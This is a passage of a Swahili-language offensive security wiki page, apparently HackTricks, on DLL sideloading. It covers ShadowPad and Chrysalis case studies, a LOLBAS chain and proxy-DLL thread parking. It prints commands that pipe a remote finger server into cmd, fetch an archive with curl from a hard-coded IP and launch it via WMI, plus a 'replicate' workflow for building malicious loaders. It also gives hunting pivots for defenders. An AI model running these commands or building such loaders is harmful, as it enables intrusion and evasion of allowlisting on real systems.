- Mbinu hii inategemea DLL name resolution na host binary. Ikiwa host inatumia absolute paths au safe loading flags (kwa mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
- KnownDLLs, SxS, na forwarded exports zinaweza kuathiri precedence na lazima zizingatiwe wakati wa kuchagua host binary na export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ilieleza jinsi Ink Dragon inavyopeleka ShadowPad kwa kutumia **three-file triad** ili kuchanganyika na software halali huku ikiweka core payload ikiwa encrypted kwenye disk:

1. **Signed host EXE** – vendors kama AMD, Realtek, au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers hubadilisha jina la executable ili ionekane kama Windows binary (kwa mfano `conhost.exe`), lakini Authenticode signature inabaki valid.
2. **Malicious loader DLL** – hudondoshwa pembeni ya EXE kwa jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL kwa kawaida ni MFC binary iliyofichwa kwa ScatterBrain framework; kazi yake pekee ni kutafuta encrypted blob, ku-decrypt, na reflectively map ShadowPad.
3. **Encrypted payload blob** – mara nyingi huhifadhiwa kama `<name>.tmp` katika directory ile ile. Baada ya memory-mapping payload iliyodecryptiwa, loader hufuta faili la TMP ili kuharibu forensic evidence.

Tradecraft notes:

* Kubadilisha jina la signed EXE (wakati ukibaki na `OriginalFileName` ya awali kwenye PE header) huiwezesha kujifanya Windows binary lakini ibaki na vendor signature, kwa hivyo replicate tabia ya Ink Dragon ya kudondosha binaries zinazoonekana kama `conhost.exe` ilhali ni AMD/NVIDIA utilities.
* Kwa kuwa executable hubaki trusted, controls nyingi za allowlisting zinahitaji tu malicious DLL yako iwe pembeni yake. Zingatia kubinafsisha loader DLL; signed parent kwa kawaida inaweza kuendeshwa bila kuguswa.
* ShadowPad decryptor inatarajia TMP blob iwe karibu na loader na iwe writable ili iweze ku-zero file baada ya mapping. Weka directory writable hadi payload ipakie; ikishaingia memory, TMP file inaweza kufutwa salama kwa OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators huoanisha DLL sideloading na LOLBAS ili artifact pekee ya custom kwenye disk iwe malicious DLL iliyo karibu na trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell huanzisha `cmd.exe /c`, hupata commands kutoka Finger server, na kuzipitisha kwa `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` huvuta TCP/79 text; `| cmd` hutekeleza response ya server, ikiruhusu operators kubadili second stage upande wa server.

- **Built-in download/extract:** Pakua archive yenye extension isiyo na madhara, iunpack, na stage sideload target pamoja na DLL chini ya random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` huficha progress na kufuata redirects; `tar -xf` hutumia Windows' built-in tar.

- **WMI/CIM launch:** Anzisha EXE kupitia WMI ili telemetry ionyeshe CIM-created process wakati inapopakia colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Hufanya kazi na binaries zinazopendelea local DLLs (kwa mfano, `intelbq.exe`, `nearby_share.exe`); payload (kwa mfano, Remcos) huendeshwa chini ya trusted name.

- **Hunting:** Toa alert kwenye `forfiles` wakati `/p`, `/m`, na `/c` vinaonekana pamoja; si kawaida nje ya admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uvamizi wa hivi karibuni wa Lotus Blossom ulitumia vibaya trusted update chain ili kupeleka NSIS-packed dropper iliyosetup DLL sideload pamoja na fully in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huweka **HIDDEN**, hudondosha renamed Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll`, na encrypted blob `BluetoothService`, kisha huanzisha EXE.
- Host EXE hu-import `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hufanya mmap-load ya blob; `LogWrite` hui-decrypt kwa custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material iliyotokana na prior hash), hu-overwrite buffer kwa plaintext shellcode, hu-free temps, na kuruka kwenda humo.
- Ili kuepuka IAT, loader hu-resolve APIs kwa hashing export names kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia Murmur-style avalanche (**0x85EBCA6B**) na kulinganisha dhidi ya salted target hashes.

Main shellcode (Chrysalis)
- Hu-decrypt PE-like main module kwa kurudia add/XOR/sub na key `gQ2JR&9;` kwa passes tano, kisha dynamically hu-load `Kernel32.dll` → `GetProcAddress` ili kumaliza import resolution.
- Hujenga upya strings za DLL name wakati wa runtime kupitia per-character bit-rotate/XOR transforms, kisha hu-load `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Hutumia second resolver inayopita **PEB → InMemoryOrderModuleList**, huchanganua kila export table katika 4-byte blocks kwa Murmur-style mixing, na hurejea `GetProcAddress` tu ikiwa hash haipatikani.

Embedded configuration & C2
- Config hukaa ndani ya faili la `BluetoothService` lililodondoshwa kwenye **offset 0x30808** (size **0x980**) na hu-decryptiwa kwa RC4 kwa key `qwhvb^435h&*7`, ikifichua C2 URL na User-Agent.
- Beacons hujenga host profile yenye dot-delimited, hu-prepend tag `4Q`, kisha hu-RC4-encrypt kwa key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Responses hu-RC4-decryptiwa na kusambazwa kwa tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode huwekewa gate na CLI args: no args = install persistence (service/Run key) ikielekeza kwenye `-i`; `-i` hu-launch upya self kwa `-k`; `-k` huruka install na kuendesha payload.

Alternate loader observed
- Uvamizi huohuo ulidondosha Tiny C Compiler na kuendesha `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, huku `libtcc.dll` ikiwa pembeni yake. C source iliyotolewa na attacker ili-embed shellcode, ika-compile, na ika-run in-memory bila kugusa disk kwa PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Hatua hii ya compile-and-run inayotegemea TCC iliingiza `Wininet.dll` wakati wa runtime na ikachota shellcode ya stage ya pili kutoka kwa URL iliyowekwa hardcoded, ikitoa loader inayonyumbulika inayojifanya kama run ya compiler.

## Signed-host sideloading with export proxying + host thread parking

Baadhi ya minyororo ya DLL sideloading huongeza **stability engineering** ili host halali ibaki hai muda wa kutosha kupakia stages za baadaye kwa usafi badala ya crash baada ya malicious DLL kupakiwa.

Muundo ulioonekana
- Dondosha trusted EXE kando ya malicious DLL kwa kutumia jina la dependency linalotarajiwa kama `version.dll`.
- Malicious DLL **proxies kila expected export** kurudi kwenye real system DLL (kwa mfano `%SystemRoot%\\System32\\version.dll`) ili import resolution iendelee kufanikiwa na host process iendelee kufanya kazi.
- Baada ya load, malicious DLL **patches the host entry point** ili main thread iingie kwenye infinite `Sleep` loop badala ya kutoka au kuendesha code paths ambazo zingekomesha process.
- Thread mpya hufanya kazi halisi mbaya: ku-decrypt jina au path ya next-stage DLL (RC4/XOR ni za kawaida), kisha kuizindua kwa `LoadLibrary`.

Kwa nini hii ni muhimu
- Normal DLL proxying huhifadhi API compatibility, lakini haihakikishi host itabaki hai muda wa kutosha kwa later stages.
- Kuweka main thread kwenye `Sleep(INFINITE)` ni njia rahisi ya kuifanya signed process ibaki resident wakati loader inafanya decryption, staging, au network bootstrap kwenye worker thread.
- Hunting ya `DllMain` tu yenye kushuku itakosa muundo huu ikiwa tabia ya kuvutia inatokea baada ya host entry point kupatched na secondary thread kuanza.

Minimal workflow
1. Nakili signed host EXE na tambua DLL inayoresolvu kutoka local directory.
2. Unda proxy DLL inayosafirisha functions zilezile na kuziforward kwenda kwenye legitimate DLL.
3. Kwenye `DllMain(DLL_PROCESS_ATTACH)`, tengeneza worker thread.
4. Kutoka kwenye thread hiyo, patch host entry point au main thread start routine ili iendelee ku-loop kwenye `Sleep`.
5. Decrypt jina/config ya next-stage DLL na piga simu `LoadLibrary` au manual-map payload.

Defensive pivots
- Signed processes zinazopakia `version.dll` au libraries nyingine za kawaida zinazofanana kutoka kwenye application directory yao badala ya `System32`.
- Memory patches kwenye process entry point muda mfupi baada ya image load, hasa jumps/calls zilizoelekezwa tena kwenda `Sleep`/`SleepEx`.
- Threads zilizoundwa na proxy DLL ambazo mara moja huita `LoadLibrary` kwenye DLL ya pili yenye jina lililodecryptiwa.
- Full-export proxy DLLs zilizowekwa kando ya vendor executables ndani ya writable staging directories kama `ProgramData`, `%TEMP%`, au unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
